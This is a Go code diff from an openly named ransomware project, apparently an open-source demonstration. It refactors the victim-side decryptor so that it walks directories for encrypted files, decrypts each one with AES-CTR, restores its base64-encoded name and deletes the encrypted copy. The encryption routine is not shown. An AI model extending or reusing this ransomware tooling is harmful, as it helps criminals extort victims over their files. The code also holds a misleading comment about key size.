@@ -1,8 +1,12 @@
 package main
 
 import (
+	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
 	"encoding/base64"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"os"
@@ -10,7 +14,6 @@ import (
 	"strings"
 	"sync"
 
-	"github.com/mauri870/cryptofile/crypto"
 	"github.com/mauri870/ransomware/cmd"
 )
 
@@ -62,7 +65,7 @@ func decryptFiles(key string) {
 
 	wg.Add(1)
 
-	// Indexing files in concurrently thread
+	// Indexing files in a concurrently thread
 	go func() {
 		// Decrease the wg count after finish this goroutine
 		defer wg.Done()
@@ -72,18 +75,17 @@ func decryptFiles(key string) {
 			folder := cmd.BaseDir + f
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
 				ext := filepath.Ext(path)
+				// Matching Files encrypted
 				if ext == cmd.EncryptionExtension {
-					// Matching Files encrypted
-					file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
 
-					// Each file is processed by a free worker on the pool, so, for each file
-					// we need wait for the respective goroutine to finish
-					wg.Add(1)
-
+					// Each file is processed by a free worker on the pool.
 					// Send the file to the MatchedFiles channel then workers
 					// can imediatelly proccess then
-					cmd.MatchedFiles <- file
 					log.Println("Matched:", path)
+					cmd.MatchedFiles <- cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
+
+					// For each file we need wait for the respective goroutine to finish
+					wg.Add(1)
 				}
 				return nil
 			})
@@ -107,41 +109,9 @@ func decryptFiles(key string) {
 					defer wg.Done()
 
 					log.Printf("Decrypting %s...\n", file.Path)
-					// Read the file content
-					ciphertext, err := ioutil.ReadFile(file.Path)
-					if err != nil {
-						log.Printf("Error opening %s\n", file.Path)
-						return
-					}
 
-					// Decrypting with the key
-					text, err := crypto.Decrypt([]byte(key), ciphertext)
-					if err != nil {
-						log.Println(err)
-						return
-					}
-
-					// Write a new file with the decrypted content and original name
-					encodedFileName := file.Name()[:len(file.Name())-len("."+file.Extension)]
-					filepathWithoutExt := file.Path[:len(file.Path)-len(filepath.Ext(file.Path))]
-					decodedFileName, err := base64.StdEncoding.DecodeString(encodedFileName)
-					if err != nil {
-						log.Println(err)
-						return
-					}
-
-					newpath := strings.Replace(filepathWithoutExt, encodedFileName, string(decodedFileName), -1)
-					err = ioutil.WriteFile(newpath, text, 0600)
-					if err != nil {
-						log.Println(err)
-						return
-					}
-
-					// Remove the encrypted file
-					os.Remove(file.Path)
-					if err != nil {
-						log.Println(err)
-					}
+					// Decrypt a single file received from the channel
+					decryptFile(file, key)
 				}
 			}
 		}()
@@ -149,4 +119,58 @@ func decryptFiles(key string) {
 
 	// Wait for all goroutines to finish
 	wg.Wait()
+}
+
+// Decrypt a single file
+func decryptFile(file cmd.File, key string) {
+	// Open the encrypted file
+	ciphertext, err := ioutil.ReadFile(file.Path)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	// Create a 128 bits cipher.Block for AES-256
+	block, err := aes.NewCipher([]byte(key))
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	// Retrieve the iv from the encrypted file
+	iv := ciphertext[:aes.BlockSize]
+	ciphertext = ciphertext[aes.BlockSize:]
+
+	stream := cipher.NewCTR(block, iv)
+	stream.XORKeyStream(ciphertext, ciphertext)
+
+	encodedFileName := file.Name()[:len(file.Name())-len("."+file.Extension)]
+	filepathWithoutExt := file.Path[:len(file.Path)-len(filepath.Ext(file.Path))]
+	decodedFileName, err := base64.StdEncoding.DecodeString(encodedFileName)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	// Get the correct output file name
+	newpath := strings.Replace(filepathWithoutExt, encodedFileName, string(decodedFileName), -1)
+
+	// Create/Open the output file
+	outFile, err := os.OpenFile(newpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	defer outFile.Close()
+
+	// Copy the decrypted content to the original file
+	if _, err = io.Copy(outFile, bytes.NewReader(ciphertext)); err != nil {
+		log.Println(err)
+		return
+	}
+
+	err = os.Remove(file.Path)
+	if err != nil {
+		log.Println("Cannot delete original file, skipping...")
+	}
 }
